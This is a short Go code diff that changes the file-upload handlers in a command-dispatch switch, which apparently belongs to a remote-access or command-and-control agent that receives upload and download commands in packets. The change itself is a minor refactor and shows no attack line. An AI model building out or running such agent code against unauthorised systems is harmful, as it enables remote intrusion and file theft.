@@ -61,12 +61,12 @@ func main() {
 									case packet.CMD_TYPE_UPLOAD_START:
 										filePath, fileData := packet.ParseCommandUpload(cmdBuf)
 										filePathStr := strings.ReplaceAll(string(filePath), "\\", "/")
-										packet.Upload(filePathStr, fileData)
+										packet.Upload(filePathStr, fileData, packet.CMD_TYPE_UPLOAD_START)
 
 									case packet.CMD_TYPE_UPLOAD_LOOP:
 										filePath, fileData := packet.ParseCommandUpload(cmdBuf)
 										filePathStr := strings.ReplaceAll(string(filePath), "\\", "/")
-										packet.Upload(filePathStr, fileData)
+										packet.Upload(filePathStr, fileData, packet.CMD_TYPE_UPLOAD_LOOP)
 
 									case packet.CMD_TYPE_DOWNLOAD:
 										filePath := cmdBuf
